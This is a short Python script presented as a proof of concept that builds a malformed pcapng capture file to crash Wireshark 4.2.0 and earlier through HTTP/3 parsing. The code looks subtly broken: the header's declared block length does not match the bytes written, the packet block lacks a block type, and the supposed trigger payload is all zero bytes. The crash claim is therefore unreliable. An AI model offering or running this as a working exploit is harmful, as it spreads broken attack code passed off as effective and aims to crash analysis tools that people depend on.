#!/usr/bin/env python3

import struct
import os

# Create a malformed HTTP3 packet trace file
filename = "http3_crash.pcapng"

# PCAPNG file header (simplified)
pcapng_header = (
    b'\x0a\x0d\x0d\x0a'  # Magic number
    b'\x1c\x00\x00\x00'  # Block length
    b'\x4d\x3c\x2b\x1a'  # Byte-order magic
    b'\x01\x00\x00\x00'  # Version
    b'\xff\xff\xff\xff'  # Section length (unspecified)
    b'\x00\x00\x00\x00'  # Options (none)
)

# Malformed HTTP3 packet data
http3_packet = (
    b'\x06\x00\x00\x00'  # Interface ID
    b'\x40\x00\x00\x00'  # Timestamp high
    b'\x00\x00\x00\x00'  # Timestamp low
    b'\x00\x00\x00\x00'  # Captured length
    b'\x00\x00\x00\x00'  # Original length
    # Malformed HTTP3 data that triggers the crash
    b'\x00\x00\x00\x00\x00\x00\x00\x00'
    b'\x00\x00\x00\x00\x00\x00\x00\x00'
)

# Write the file
with open(filename, 'wb') as f:
    f.write(pcapng_header)
    f.write(http3_packet)

print(f"Created malformed HTTP3 packet capture file: {filename}")
print(f"Open this file in Wireshark <= 4.2.0 to trigger the crash")